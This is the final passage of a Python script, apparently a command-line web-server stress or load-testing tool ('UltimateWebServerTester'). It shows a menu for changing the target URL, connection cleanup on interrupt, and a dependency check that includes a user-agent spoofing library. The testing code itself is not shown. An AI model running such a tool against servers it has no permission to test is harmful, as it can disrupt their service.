                new_url = input(f"\n{Fore.YELLOW}[?] Enter new target URL: {Fore.WHITE}").strip()
                if new_url:
                    tester = UltimateWebServerTester(new_url)
                    print(f"{Fore.GREEN}[✓] Target changed to: {new_url}")
                else:
                    print(f"{Fore.RED}[✗] Invalid URL!")
            
            else:
                print(f"{Fore.RED}[✗] Invalid option!")
            
            input(f"\n{Fore.YELLOW}[?] Press Enter to continue...")
            display_banner()
            
        except KeyboardInterrupt:
            print(f"\n\n{Fore.YELLOW}[!] Program stopped by user")
            tester.is_testing = False
            tester.cleanup_connections()
            break
        except Exception as e:
            print(f"\n{Fore.RED}[✗] Error: {str(e)}")
            time.sleep(2)

if __name__ == "__main__":
    # Check requirements
    try:
        import requests
        import colorama
        from fake_useragent import UserAgent
    except ImportError:
        print(f"{Fore.RED}[✗] Missing packages. Install with:")
        print(f"{Fore.YELLOW}pip install requests colorama fake-useragent")
        sys.exit(1)
    
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}[!] Program terminated")
    except Exception as e:
        print(f"\n{Fore.RED}[✗] Fatal error: {str(e)}")